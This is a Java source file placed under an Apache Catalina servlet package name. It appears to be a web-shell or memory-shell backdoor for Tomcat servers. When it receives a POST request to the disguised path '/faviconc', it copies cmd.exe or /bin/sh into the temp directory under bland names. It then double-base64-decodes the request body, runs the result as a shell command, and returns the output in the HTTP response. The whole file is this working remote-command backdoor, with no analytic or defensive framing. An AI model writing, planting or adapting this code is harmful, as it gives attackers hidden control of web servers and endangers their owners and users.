package org.apache.catalina.servlets.sl;

import org.apache.catalina.servlets.redefine.MyRequest;
import org.apache.catalina.servlets.redefine.MyResponse;
import org.apache.catalina.servlets.redefine.MyServletOutputStream;

public class C {
    private static final String pathPattern= "/faviconc";
    private static void copyFileUsingFileStreams(java.io.File source, java.io.File dest) throws java.io.IOException {
        java.io.InputStream input = null;
        java.io.OutputStream output = null;
        try {
            input = new java.io.FileInputStream(source);
            output = new java.io.FileOutputStream(dest);
            byte[] buf = new byte[1024];
            int bytesRead;
            while ((bytesRead = input.read(buf)) > 0) {
                output.write(buf, 0, bytesRead);
            }
        } finally {
            input.close();
            output.close();
        }
    }
    private static byte[] r(java.io.InputStream i) {
        byte[] temp = new byte[1024];
        java.io.ByteArrayOutputStream b = new java.io.ByteArrayOutputStream();
        int n;
        try {
            while((n = i.read(temp)) != -1) {b.write(temp, 0, n);
            }} catch (Exception ignored) {
        }
        return b.toByteArray();
    }
    public static void doService(Object obj, String url,String method, java.io.InputStream in){
        if (url.matches(pathPattern)){
            if (method.equals("POST")){
                java.util.Map objMap = (java.util.Map)obj;
                Object request = objMap.get("request");
                Object response = objMap.get("response");
                String tmpdir = System.getProperty("java.io.tmpdir");
                boolean bool = System.getProperty("os.name").toLowerCase().startsWith("windows");
                java.io.File source;
                java.io.File dest;
                String c;
                if (bool){
                    source = new java.io.File("C:\\Windows\\System32\\cmd.exe");
                    dest = new java.io.File(tmpdir + java.io.File.separator + "c.exe");
                    c = "/c";
                }else {
                    source = new java.io.File("/bin/sh");
                    dest = new java.io.File(tmpdir + java.io.File.separator + "s");
                    c = "-c";
                }

                try {
                    ClassLoader loader = MyRequest.getServletContext(request).getClass().getClassLoader();
                    copyFileUsingFileStreams(source,dest);
                    boolean exists = dest.exists();
                    if (exists) {
                        dest.setExecutable(true);
                        byte[] cc = r(in);
                        try {
                            Class Base64 = loader.loadClass("sun.misc.BASE64Decoder");
                            Object Decoder = Base64.newInstance();
                            cc=(byte[]) Decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(Decoder, new Object[]{new String(cc)});
                            cc=(byte[]) Decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(Decoder, new Object[]{new String(cc)});
                        } catch (Throwable ex)
                        {
                            Class Base64 = loader.loadClass("java.util.Base64");
                            Object Decoder = Base64.getDeclaredMethod("getDecoder",new Class[0]).invoke(null, new Object[0]);
                            cc=(byte[])Decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(Decoder, new Object[]{new String(cc)});
                            cc=(byte[])Decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(Decoder, new Object[]{new String(cc)});
                        }
                        Process process = Runtime.getRuntime().exec(new String[] { dest.getCanonicalPath(), c, new String(cc) });
                        java.io.InputStream inputStream = process.getInputStream();
                        StringBuilder stringBuilder = new StringBuilder();
                        int i;
                        while ((i = inputStream.read()) != -1)
                            stringBuilder.append((char)i);
                        inputStream.close();
                        process.waitFor();
                        java.io.OutputStream so = (java.io.OutputStream) MyResponse.getOutputStream(response);
                        MyServletOutputStream.write(so, stringBuilder.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8), 0, stringBuilder.length());
                        MyServletOutputStream.flush(so);
                        MyServletOutputStream.close(so);
                    }
                } catch (Exception e) {
                    try {
                        java.io.OutputStream so = (java.io.OutputStream) MyResponse.getOutputStream(response);
                        MyServletOutputStream.write(so, e.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8), 0, e.toString().length());
                        MyServletOutputStream.flush(so);
                        MyServletOutputStream.close(so);
                    } catch (Exception ignored) {
                    }
                }
            }
        }
    }
}
